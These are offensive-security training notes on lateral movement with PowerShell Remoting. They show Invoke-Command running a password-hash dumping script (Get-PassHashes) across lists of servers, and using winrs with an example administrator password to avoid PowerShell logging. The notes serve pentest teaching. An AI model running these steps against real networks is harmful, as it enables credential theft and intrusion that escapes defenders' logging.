# Lateral Movement — PowerShell Remoting

**Date:** 27 July 2026

---

## PowerShell Remoting Overview

PSRemoting is like psexec on steroids — much more silent and super fast!

**Key Features:**
- Uses Windows Remote Management (WinRM) — Microsoft's WS-Management implementation
- Enabled by default on Server 2012+ with firewall exception
- Listens on 5985 (HTTP) and 5986 (HTTPS)
- Recommended for managing Windows Core servers
- Executes as high integrity process (elevated shell)

---

## One-to-One Remoting (PSSession)

**Characteristics:**
- Interactive
- Runs in new process (wsmprovhost)
- Stateful (maintains state between commands)

**Useful Cmdlets:**
```powershell
New-PSSession -ComputerName server1
Enter-PSSession -ComputerName server1
```

---

## One-to-Many Remoting (Fan-out)

Non-interactive, parallel command execution using `Invoke-Command`.

**Execute scriptblock on multiple servers:**
```powershell
Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
```

**Execute script from file:**
```powershell
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

**Execute locally loaded function on remote machines:**
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
```

**Pass arguments (positional only):**
```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList $arg1, $arg2
```

---

## Stateful Remoting with Invoke-Command

Run commands that maintain state between executions:

```powershell
$Sess = New-PSSession -ComputerName Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```

First command sets variable, second command uses it.

---

## Logging Considerations

PSRemoting supports:
- System-wide transcripts
- Deep script block logging

---

## Evade PSRemoting Logging: Use winrs

Use `winrs` instead of PSRemoting to evade logging (still uses port 5985):

```powershell
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
```

---

## Alternative: WinRM via COM Objects

Use winrm.vbs and WSMan COM objects for alternative execution:

```
https://github.com/bohops/WSMan-WinRM
```

---

## References

- [PowerShell Remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands)
- [WSMan-WinRM](https://github.com/bohops/WSMan-WinRM)

---

*Next: Learning Objective 7 — Kerberoasting & Credential Extraction*
